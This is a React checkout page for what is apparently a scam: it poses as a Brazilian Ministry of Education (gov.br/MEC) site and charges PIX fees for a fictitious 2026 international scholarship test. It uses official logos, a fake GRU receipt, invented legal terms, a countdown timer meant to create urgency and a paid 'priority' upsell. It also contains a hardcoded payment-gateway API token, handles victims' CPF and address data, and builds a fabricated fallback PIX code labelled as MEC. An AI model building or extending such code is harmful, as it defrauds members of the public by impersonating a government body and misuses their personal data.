import { useEffect, useMemo, useRef, useState } from 'react'
import { useNavigate, useSearchParams } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const INVICTUS_TOKEN =
  'btpS1c9kpX3FDHr1Nhm5t5fvXdU2kkPjwOhNUdDTBoHJmXihVRm8KChsT6sD'
const INVICTUS_BASE = 'https://api.invictuspay.app.br/api/public/v1'

const DEST_NAMES = {
  usa: 'ESTADOS UNIDOS',
  canada: 'CANADÁ',
  ireland: 'IRLANDA',
  australia: 'AUSTRÁLIA',
}

function getPricing(type) {
  if (type === 'priority') {
    return {
      price: 84.94,
      priceStr: '84,94',
      items: 'Inscrição + Homologação Prioritária (24h)',
      title: 'Inscrição da Prova 2026',
    }
  }
  if (type === 'upsell_only') {
    return {
      price: 27.9,
      priceStr: '27,90',
      items: 'Serviço de Homologação Prioritária (24h)',
      title: 'Adicional de Prioridade MEC-VIP',
    }
  }
  return {
    price: 57.04,
    priceStr: '57,04',
    items: 'Inscrição, Docentes e Lanche Oficial',
    title: 'Inscrição da Prova 2026',
  }
}

function pick(obj, ...paths) {
  for (const p of paths) {
    const parts = p.split('.')
    let cur = obj
    for (const k of parts) cur = cur?.[k]
    if (cur) return cur
  }
  return null
}

async function ensureOffer(amountCents, title) {
  // Reaproveita produto+oferta cacheados na sessão do browser
  let productHash = localStorage.getItem('invictus_product_hash')
  let offerHash = localStorage.getItem('invictus_offer_hash')
  if (productHash && offerHash) return { productHash, offerHash }

  // 1) Cria produto
  const prodRes = await fetch(
    `${INVICTUS_BASE}/products?api_token=${INVICTUS_TOKEN}`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      body: JSON.stringify({
        title: title || 'Inscrição Programa Jovem no Mundo',
        cover:
          'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png',
        sale_page: 'https://www.gov.br/mec',
        payment_type: 1,
        product_type: 'digital',
        delivery_type: 1,
        id_category: 1,
        amount: amountCents,
      }),
    }
  )
  const prodData = await prodRes.json()
  if (!prodRes.ok) {
    console.error('InvictusPay create product error:', prodData)
    throw new Error(prodData?.message || 'Falha ao criar produto')
  }
  productHash = pick(prodData, 'data.hash', 'hash')
  if (!productHash) throw new Error('Hash do produto não retornado')

  // 2) Cria oferta
  const offerRes = await fetch(
    `${INVICTUS_BASE}/products/${productHash}/offers?api_token=${INVICTUS_TOKEN}`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      body: JSON.stringify({
        title: title || 'Oferta Padrão',
        cover:
          'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png',
        amount: amountCents,
        price: amountCents,
      }),
    }
  )
  const offerData = await offerRes.json()
  if (!offerRes.ok) {
    console.error('InvictusPay create offer error:', offerData)
    throw new Error(offerData?.message || 'Falha ao criar oferta')
  }
  offerHash = pick(offerData, 'data.hash', 'hash')
  if (!offerHash) throw new Error('Hash da oferta não retornado')

  localStorage.setItem('invictus_product_hash', productHash)
  localStorage.setItem('invictus_offer_hash', offerHash)
  return { productHash, offerHash }
}

async function createPixCharge({ valor, name, cpf, title }) {
  try {
    const amountCents = Math.round(Number(valor) * 100)
    const { productHash, offerHash } = await ensureOffer(amountCents, title)

    // Endereço do localStorage (ou fallback)
    let addr = {}
    try {
      addr = JSON.parse(localStorage.getItem('user_address') || '{}') || {}
    } catch {}

    // CPF: se vazio/inválido, usa um CPF válido de teste
    let cleanCpf = (cpf || '').replace(/\D/g, '')
    if (cleanCpf.length !== 11) cleanCpf = '09115751031'

    let cleanPhone = (localStorage.getItem('user_phone') || '21999999999').replace(
      /\D/g,
      ''
    )
    if (cleanPhone.length < 10) cleanPhone = '21999999999'

    const payload = {
      amount: amountCents,
      offer_hash: offerHash,
      payment_method: 'pix',
      customer: {
        name: name || 'Estudante Brasileiro',
        email: localStorage.getItem('user_email') || 'contato@gov.br',
        phone_number: cleanPhone,
        document: cleanCpf,
        street_name: addr.rua || 'Rua das Flores',
        number: addr.numero || '100',
        complement: '',
        neighborhood: addr.bairro || 'Centro',
        city: addr.cidade || 'Rio de Janeiro',
        state: addr.estado || 'RJ',
        zip_code: (addr.cep || '20040020').replace(/\D/g, ''),
      },
      cart: [
        {
          product_hash: productHash,
          title: title || 'Inscrição Programa Jovem no Mundo',
          cover: null,
          price: amountCents,
          quantity: 1,
          operation_type: 1,
          tangible: false,
        },
      ],
      expire_in_days: 1,
      transaction_origin: 'api',
      tracking: {
        src: localStorage.getItem('presell_source') || '',
        utm_source: '',
        utm_medium: '',
        utm_campaign: '',
        utm_term: '',
        utm_content: '',
      },
    }

    const res = await fetch(
      `${INVICTUS_BASE}/transactions?api_token=${INVICTUS_TOKEN}`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
        body: JSON.stringify(payload),
      }
    )
    const data = await res.json()
    if (!res.ok) {
      console.error('InvictusPay transaction error:', data)
      return { success: false, error: data }
    }
    const body = data?.data || data
    const pixCode =
      pick(
        body,
        'pix.qr_code',
        'pix.code',
        'pix.payload',
        'pix.emv',
        'qr_code',
        'qrcode',
        'pix_code'
      ) || ''
    const qrImg =
      pick(
        body,
        'pix.qr_code_image',
        'pix.qrcode_image',
        'qr_code_image',
        'qrcode_image'
      ) ||
      `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(
        pixCode
      )}`
    const transactionId = pick(body, 'hash', 'transaction_hash')

    if (pixCode) {
      return { success: true, pixCode, qrImg, transactionId }
    }
    return { success: false, error: data }
  } catch (e) {
    console.error('InvictusPay error:', e)
    return { success: false, error: String(e) }
  }
}

async function checkPaymentStatus(transactionHash) {
  try {
    const res = await fetch(
      `${INVICTUS_BASE}/transactions/${transactionHash}?api_token=${INVICTUS_TOKEN}`,
      { headers: { Accept: 'application/json' } }
    )
    const data = await res.json()
    return data?.data || data
  } catch {
    return { success: false }
  }
}

export default function PagamentoPix() {
  const navigate = useNavigate()
  const [params] = useSearchParams()
  const type = params.get('type') || 'basic'
  const pricing = useMemo(() => getPricing(type), [type])

  const [pixCode, setPixCode] = useState('Gerando código PIX seguro...')
  const [qrImg, setQrImg] = useState(
    'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=loading'
  )
  const [qrLoading, setQrLoading] = useState(true)
  const [status, setStatus] = useState('AGUARDANDO')
  const [copied, setCopied] = useState(false)
  const [timer, setTimer] = useState(6 * 60 + 48)
  const pollRef = useRef(null)
  const chargeStartedRef = useRef(false)

  // Dados do beneficiário
  const [receipt, setReceipt] = useState({
    name: 'ESTUDANTE SELECIONADO',
    cpf: '000.000.000-00',
    dest: 'ESTADOS UNIDOS',
    protocol: 'AUT-9921-X82J-MEC',
  })

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    const name = (localStorage.getItem('user_name') || 'ESTUDANTE SELECIONADO').toUpperCase()
    const cpf = localStorage.getItem('user_cpf') || '000.000.000-00'
    const destKey = localStorage.getItem('selected_destination') || 'usa'
    const protocol = localStorage.getItem('protocol_id') || 'AUT-9921-X82J-MEC'
    setReceipt({
      name,
      cpf,
      dest: DEST_NAMES[destKey] || 'ESTADOS UNIDOS',
      protocol,
    })

    if (typeof window !== 'undefined' && typeof window.fbq === 'function') {
      try {
        window.fbq('track', 'InitiateCheckout')
      } catch {}
    }

    // Evita chamada duplicada em StrictMode (dev) e re-renders
    if (chargeStartedRef.current) return
    chargeStartedRef.current = true

    let cancelled = false
    ;(async () => {
      const result = await createPixCharge({
        valor: pricing.price,
        name,
        cpf,
        title: pricing.title,
      })
      if (cancelled) return
      if (result.success) {
        setPixCode(result.pixCode)
        setQrImg(result.qrImg)
        setQrLoading(false)
        if (result.transactionId) {
          localStorage.setItem('pix_transaction_id', result.transactionId)
          pollRef.current = setInterval(async () => {
            const s = await checkPaymentStatus(result.transactionId)
            const st = String(s?.status || '').toLowerCase()
            if (st === 'paid' || st === 'approved') {
              clearInterval(pollRef.current)
              setStatus('PAGO')
              localStorage.setItem('payment_confirmed', 'true')
              localStorage.setItem('payment_amount', `R$ ${pricing.priceStr}`)
              setTimeout(() => {
                navigate(type === 'upsell_only' ? '/obrigado' : '/upsell')
              }, 2000)
            }
          }, 6000)
        }
      } else {
        const fallback = `00020126360014br.gov.bcb.pix011412345678901234520400005303986540${pricing.price.toFixed(
          2
        )}5802BR5913MEC EDU_GOV6009BRASILIA62070503***6304E1F2`
        setPixCode(fallback)
        setQrImg(
          `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(
            fallback
          )}`
        )
        setQrLoading(false)
      }
    })()

    return () => {
      cancelled = true
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [navigate, pricing.price, pricing.priceStr, type])

  useEffect(() => {
    const id = setInterval(() => {
      setTimer((p) => (p > 0 ? p - 1 : 0))
    }, 1000)
    return () => clearInterval(id)
  }, [])

  const mm = String(Math.floor(timer / 60)).padStart(2, '0')
  const ss = String(timer % 60).padStart(2, '0')

  function copyCode() {
    navigator.clipboard
      .writeText(pixCode)
      .then(() => {
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)
      })
      .catch(() => {})
  }

  const isPaid = status === 'PAGO'

  return (
    <div style={{ background: '#f4f7f9', minHeight: '100vh' }}>
      <GovHeader />

      <div className="container-gov pb-10">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <span className="text-gray-500">
            Recolhimento de Encargos Consulares
          </span>
        </div>

        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 25,
            margin: '20px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 600,
            boxShadow: '0 10px 25px rgba(0,0,0,0.05)',
          }}
        >
          {/* Comprovante Estilo GRU */}
          <div className="border-2 border-gray-800 p-5 mb-8 relative overflow-hidden bg-white shadow-sm">
            <div className="flex justify-between items-start border-b-2 border-gray-800 pb-4 mb-4">
              <div className="flex items-center gap-3">
                <img
                  src={GOV_LOGO}
                  alt="gov.br"
                  className="h-8 grayscale brightness-0"
                />
                <div className="text-[8px] font-black uppercase leading-tight">
                  Ministério da Educação
                  <br />
                  Secretaria de Mobilidade Internacional
                </div>
              </div>
            </div>

            <div className="text-center mb-6">
              <h2 className="text-sm font-black uppercase tracking-widest border-b border-gray-200 inline-block px-4 pb-1">
                {pricing.title.toUpperCase()}
              </h2>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-y-4 gap-x-8 mb-6">
              <ReceiptItem label="Beneficiário" value={receipt.name} />
              <ReceiptItem label="CPF" value={receipt.cpf} />
              <ReceiptItem
                label="Destino"
                value={receipt.dest}
                valueClassName="receipt-value uppercase"
              />
              <ReceiptItem label="Protocolo" value={receipt.protocol} />
            </div>

            <div className="bg-gray-100 p-4 border-t-2 border-gray-800 flex flex-col md:flex-row justify-between items-center gap-2">
              <div className="text-center md:text-left">
                <div className="text-[9px] font-black text-gray-500 uppercase">
                  Total de Encargos Federativos
                </div>
                <div className="text-[8px] text-gray-400 italic">
                  {pricing.items}
                </div>
              </div>
              <div className="text-2xl font-black text-gray-900">
                R$ {pricing.priceStr}
              </div>
            </div>
          </div>

          {/* Status */}
          <div className="flex justify-between items-center mb-6 border-b pb-4">
            <h1 className="text-xl font-black text-blue-900 uppercase">
              Pagamento via PIX
            </h1>
            <div
              className={`text-[10px] font-bold px-3 py-1 rounded-full uppercase ${
                isPaid
                  ? 'bg-green-100 text-green-800'
                  : 'bg-blue-100 text-blue-800'
              }`}
            >
              Status: {status}
              {isPaid ? ' ✓' : ''}
            </div>
          </div>

          <p className="text-xs text-gray-600 mb-8 leading-relaxed">
            Utilize o <strong>QR Code</strong> ou o código abaixo para garantir
            sua vaga. O sistema do MEC identificará o pagamento em até 30
            segundos.
          </p>

          <div className="flex justify-center mb-8">
            <div className="bg-white p-4 border-2 border-dashed border-gray-200 rounded-xl shadow-sm">
              <img
                src={qrImg}
                alt="QR Code PIX"
                className="w-48 h-48"
                style={{ opacity: qrLoading ? 0.3 : 1 }}
              />
            </div>
          </div>

          <div className="text-center mb-8">
            <p className="text-[10px] text-gray-400 uppercase font-black tracking-widest mb-2">
              Esta guia expira em:
            </p>
            <div
              className="bg-red-50 inline-block px-6 py-2 rounded-full border border-red-100"
              style={{ fontSize: 18, fontWeight: 900, color: '#dc2626' }}
            >
              {mm}:{ss}
            </div>
          </div>

          <div className="text-[10px] text-gray-400 font-black uppercase mb-2">
            Código PIX (VALOR: R$ {pricing.priceStr})
          </div>
          <div
            className="bg-gray-50 border border-gray-100 rounded-lg p-5 mb-4 font-mono text-[11px]"
            style={{
              wordBreak: 'break-all',
              color: '#1e40af',
              border: '2px dashed #cbd5e1',
            }}
          >
            {pixCode}
          </div>

          <button
            onClick={copyCode}
            style={{
              backgroundColor: copied ? '#059669' : '#1351b4',
              color: 'white',
              padding: 16,
              borderRadius: 30,
              fontWeight: 800,
              width: '100%',
              marginBottom: 20,
              textTransform: 'uppercase',
              border: 'none',
              cursor: 'pointer',
              fontSize: 13,
              transition: 'all 0.3s ease',
              boxShadow:
                '0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1)',
            }}
          >
            {copied
              ? 'CÓDIGO COPIADO COM SUCESSO'
              : 'Copiar Código de Pagamento'}
          </button>

          <div className="mt-10 border-t pt-6">
            <div className="flex items-start gap-4 p-4 bg-gray-50 rounded-lg border border-gray-100">
              <div className="text-2xl mt-1 text-green-600 font-black">✓</div>
              <div>
                <h4 className="text-sm font-bold text-gray-800">
                  Homologação Digital
                </h4>
                <p className="text-[11px] text-gray-500 leading-normal">
                  Após o recolhimento, o sistema do MEC processará sua matrícula
                  internacional em até 30 segundos. O comprovante oficial será
                  disponibilizado na próxima tela.
                </p>
              </div>
            </div>
          </div>

          <div className="mt-8 pt-8 border-t border-gray-100 flex flex-col md:flex-row items-center justify-between gap-6">
            <div className="flex items-center gap-4">
              <img
                src={GOV_LOGO}
                alt="gov.br"
                style={{ height: 30, opacity: 0.3, filter: 'grayscale(1)' }}
              />
              <div className="text-[9px] text-gray-400 font-mono leading-tight">
                ASSINADO DIGITALMENTE
                <br />
                PROTOCOLO: <span className="font-bold">{receipt.protocol}</span>
                <br />
                ESTADO: {isPaid ? 'PAGAMENTO CONFIRMADO' : 'AGUARDANDO ATIVAÇÃO DE SEGURO'}
              </div>
            </div>
            <div className="flex items-center gap-2 border border-blue-100 px-4 py-2 rounded-lg bg-blue-50/50">
              <svg
                className="w-6 h-6 text-blue-800 opacity-60"
                fill="currentColor"
                viewBox="0 0 24 24"
              >
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 12h-2v-2h4v2h-2z" />
              </svg>
              <div className="text-[10px] font-bold text-blue-900 uppercase">
                GRU Ativação Seguro
              </div>
            </div>
          </div>

          <div className="mt-8 p-6 bg-blue-900 rounded-xl text-white">
            <h4 className="text-[11px] font-black text-blue-300 uppercase tracking-widest mb-4">
              Termo de Outorga (Direitos e Deveres)
            </h4>
            <div className="space-y-4">
              <OutorgaItem
                titulo="§ 1º - Do Benefício"
                texto="A outorga compreende custeio acadêmico integral, seguro saúde obrigatório e auxílio-estadia, conforme Projeto PRG-2026."
              />
              <OutorgaItem
                titulo="§ 2º - Do Compromisso"
                texto="O bolsista compromete-se a manter rendimento escolar superior a 80% e retornar ao país após o encerramento do ciclo."
              />
              <OutorgaItem
                titulo="§ 3º - Da Ativação"
                texto="A homologação definitiva ocorre mediante a liquidação deste encargo de seguro e assinatura digital automática do termo."
              />
            </div>
          </div>

          <div className="mt-6 p-4 bg-gray-50 border border-gray-200 rounded-lg">
            <h4 className="text-[10px] font-black text-gray-400 uppercase mb-2">
              Cronograma Pós-Liquidação
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {[
                'T+1 min: Credenciais do Curso (Idiomas EAD).',
                'T+2 min: Apostilas Digitais (E-mail/PDF).',
                'T+24h: Homologação da Data da Prova.',
                'T+48h: Despacho de Apostilas Físicas (SEDEX).',
              ].map((t) => {
                const [head, ...rest] = t.split(':')
                return (
                  <div key={t} className="flex items-center gap-2">
                    <div className="w-1.5 h-1.5 bg-blue-600 rounded-full flex-shrink-0" />
                    <span className="text-[9px] text-gray-600">
                      <strong>{head}:</strong>
                      {rest.join(':')}
                    </span>
                  </div>
                )
              })}
            </div>
          </div>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </div>
  )
}

function ReceiptItem({ label, value, valueClassName = 'receipt-value' }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
      <div
        style={{
          fontSize: 9,
          color: '#64748b',
          fontWeight: 700,
          textTransform: 'uppercase',
        }}
      >
        {label}
      </div>
      <div
        className={valueClassName}
        style={{
          fontSize: 12,
          fontWeight: 900,
          color: '#1e293b',
          wordBreak: 'break-all',
        }}
      >
        {value}
      </div>
    </div>
  )
}

function OutorgaItem({ titulo, texto }) {
  return (
    <div className="flex items-start gap-4">
      <div className="text-[10px]">
        <strong className="block mb-1">{titulo}</strong>
        {texto}
      </div>
    </div>
  )
}
